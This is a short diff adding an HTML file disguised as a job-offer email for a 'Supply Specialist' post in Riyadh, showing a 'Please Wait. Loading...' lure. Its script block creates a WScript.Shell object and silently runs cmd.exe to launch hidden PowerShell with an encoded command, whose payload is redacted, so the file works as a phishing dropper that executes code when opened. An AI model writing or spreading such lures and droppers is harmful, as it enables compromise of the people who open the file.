@@ -1,0 +1,12 @@
+<h1>Please Wait. Loading...</h1>
+
+<head>
+<title>Supply Specialist, Riyadh, Alsalam Company</title>
+</head>
+
+# body of the email would go here
+
+<script>
+a=new ActiveXObject("WScript.Shell");
+a.run('%windir%\\System32\\cmd.exe /c powershell -window hidden -enc <redacted encoded command>', 0);
+</script>
